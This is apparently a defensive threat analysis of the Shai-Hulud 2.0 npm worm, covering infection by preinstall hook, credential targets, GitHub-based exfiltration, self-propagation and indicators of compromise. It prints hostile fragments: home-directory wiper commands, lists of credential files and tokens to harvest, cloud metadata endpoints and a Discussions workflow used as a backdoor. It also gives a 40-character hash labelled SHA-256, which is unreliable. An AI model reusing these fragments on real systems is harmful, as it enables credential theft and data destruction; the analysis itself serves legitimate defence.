# 🎯 Threat Overview: Shai-Hulud 2.0

> Complete technical analysis of the npm supply-chain worm

## Timeline

| Date | Event |
|------|-------|
| 2025-09-15 | Shai-Hulud v1 – first wave, 180+ packages |
| 2025-09-23 | CISA issues alert |
| 2025-11-21 | Shai-Hulud 2.0 – upload of first malicious packages |
| 2025-11-24 01:22 UTC | First exfiltration repos on GitHub |
| 2025-11-24 03:00 UTC | Massive spread on npm |
| 2025-11-25 22:45 UTC | Second phase: "The Continued Coming" |
| 2025-11-26 | GitHub begins revoking, ~300 public repos |
| 2025-12-09 | npm plans deprecation of classic tokens |

## Attack Anatomy

### 1. Initial Access

The attacker gains access to a maintainer's npm account through one of these methods:

- **Phishing** – fake emails from npm about "MFA update"
- **Credential stuffing** – using leaked passwords from other breaches
- **CI/CD compromise** – stealing tokens from GitHub Actions
- **Social engineering** – direct contact with maintainer

### 2. Infection Vector

```
Compromised package → npm publish → Developer runs npm install → Payload executes
```

**Key change in 2.0:** Payload runs in the `preinstall` phase:

```json
{
  "scripts": {
    "preinstall": "node setup_bun.js"
  }
}
```

This means the code runs **BEFORE** dependency installation and **BEFORE** any static scanning.

### 3. Payload Structure

```
package/
├── package.json          # Modified with preinstall script
├── setup_bun.js          # Loader (stage 1)
└── bun_environment.js    # Main payload (stage 2, obfuscated)
```

**setup_bun.js** (Loader):
1. Detects OS (Linux/macOS/Windows)
2. Downloads and installs Bun runtime (if missing)
3. Runs `bun_environment.js` as a detached process

**bun_environment.js** (Main payload):
- ~500KB obfuscated JavaScript
- Bundled with all dependencies
- Uses triple base64 encoding for exfiltration

### 4. Credential Harvesting

The malware actively searches for credentials in these locations:

#### Local Files

| Path | Type |
|------|------|
| `~/.npmrc` | npm token |
| `~/.bun/credentials` | bun credentials |
| `~/.gitconfig` | Git credentials |
| `~/.ssh/*` | SSH keys |
| `~/.aws/credentials` | AWS credentials |
| `~/.aws/config` | AWS config |
| `~/.azure/` | Azure credentials |
| `~/.config/gcloud/application_default_credentials.json` | GCP credentials |
| `~/.docker/config.json` | Docker registry tokens |
| `~/.kube/config` | Kubernetes credentials |

#### Environment Variables

```javascript
// Targeted env vars
const targets = [
  'NPM_TOKEN', 'NODE_AUTH_TOKEN',
  'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT',
  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
  'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
  'GOOGLE_APPLICATION_CREDENTIALS', 'GCLOUD_SERVICE_KEY',
  'DOCKER_USERNAME', 'DOCKER_PASSWORD',
  'SLACK_TOKEN', 'SLACK_WEBHOOK',
  'DATADOG_API_KEY', 'DD_API_KEY'
];
```

#### GitHub Actions Secrets

The malware enumerates all user repositories and extracts:
- Repository secrets
- Environment secrets
- Organization secrets (if accessible)

#### Cloud Metadata Services

```javascript
// IMDS endpoints
const imds = {
  aws: 'http://169.254.169.254/latest/meta-data/',
  gcp: 'http://metadata.google.internal/computeMetadata/v1/',
  azure: 'http://169.254.169.254/metadata/instance'
};
```

#### TruffleHog Integration

The malware downloads the legitimate TruffleHog binary and uses it to actively search for secrets in the filesystem.

### 5. Exfiltration

#### Primary method: GitHub Repos

```javascript
// Create exfiltration repo
const repoName = generateRandomName(); // 18 random chars
const description = "Sha1-Hulud: The Second Coming.";

// Files in repo
const files = [
  'cloud.json',        // Cloud credentials (AWS/GCP/Azure)
  'contents.json',     // Local files with credentials
  'environment.json',  // Environment variables
  'truffleSecrets.json', // TruffleHog findings
  'actionsSecrets.json'  // GitHub Actions secrets
];

// Data is triple base64 encoded
const encoded = btoa(btoa(btoa(JSON.stringify(data))));
```

#### Fallback method: Cross-victim exfiltration

If it doesn't have GitHub credentials, it uses credentials stolen from another victim to create an exfiltration repo under their account.

### 6. Self-Propagation

```javascript
// Worm propagation logic
async function propagate(npmToken) {
  const packages = await getUserPackages(npmToken);
  const targetCount = Math.min(packages.length, 100); // Max 100 packages
  
  for (const pkg of packages.slice(0, targetCount)) {
    await injectPayload(pkg);
    await publishMaliciousVersion(pkg, npmToken);
  }
}
```

### 7. Persistence

#### GitHub Discussions Backdoor

The malware creates a workflow file `.github/workflows/discussion.yaml`:

```yaml
name: Discussion Create
on:
  discussion:
jobs:
  process:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo ${{ github.event.discussion.body }}
```

This registers the infected machine as a self-hosted runner and enables remote command execution via GitHub Discussions.

### 8. Destructive Fallback (Dead-man switch)

If data exfiltration or token discovery fails:

```javascript
// Unix wiper
if (platform !== 'win32') {
  execSync('rm -rf ~/*');
  execSync('find ~ -type d -empty -delete');
}

// Windows wiper
if (platform === 'win32') {
  execSync('rd /s /q %USERPROFILE%');
}
```

## Technical IOCs

### File Hashes (SHA-256)

```
setup_bun.js:     d60ec97eea19fffb4809bc35b91033b52490ca11
bun_environment.js: [varies per version]
```

### Network Indicators

- `api.github.com` – for exfiltration and propagation
- `registry.npmjs.org` – for publishing malicious packages
- `github.com/repos/*/releases` – downloading TruffleHog
- Cloud IMDS endpoints

### Behavioral Indicators

1. Unexpected Bun runtime installation
2. `bun` or `bun_environment` processes
3. Access to `~/.npmrc`, `~/.aws/`, `~/.azure/`
4. GitHub API calls from unexpected processes
5. Creation of `.truffler-cache` directory
6. New workflow files in `.github/workflows/`

## Affected Ecosystems

### Primary: npm

- 796+ unique packages
- 1092+ malicious versions
- 20+ million weekly downloads

### Secondary: Maven Central

Through `org.mvnpm` automatic npm→Maven conversion, Java projects were also affected.

### Known Prominent Victims

| Project | Packages |
|---------|----------|
| **Zapier** | zapier-platform-core, zapier-platform-cli, zapier-sdk |
| **ENS Domains** | @ensdomains/ensjs, @ensdomains/content-hash |
| **PostHog** | posthog-node, posthog-js, @posthog/agent |
| **Postman** | @postman/tunnel-agent, @postman/postman-mcp-cli |
| **AsyncAPI** | @asyncapi/specs, @asyncapi/openapi-schema-parser |

## Attribution

- Possibly different threat actor than Shai-Hulud v1
- Differences in payload structure and TTPs
- Use of same naming convention
- Unit 42 estimates with moderate confidence the use of LLM for code generation

## References

- [Palo Alto Unit 42 Analysis](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/)
- [Wiz Research](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [Socket.dev Blog](https://socket.dev/blog/shai-hulud-strikes-again-v2)
- [SafeDep Incident Report](https://safedep.io/shai-hulud-second-coming-supply-chain-attack/)
